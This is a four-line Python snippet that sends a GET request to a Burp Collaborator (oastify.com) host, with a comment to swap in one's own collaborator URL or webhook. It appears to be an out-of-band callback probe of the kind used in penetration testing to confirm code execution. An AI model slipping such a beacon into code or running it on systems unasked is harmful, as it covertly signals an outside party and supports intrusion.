import os
import requests

# Replace with your collaborator URL or webhook
requests.get("https://79eivgnq69ixx38uux6bidacl3rufk39.oastify.com")
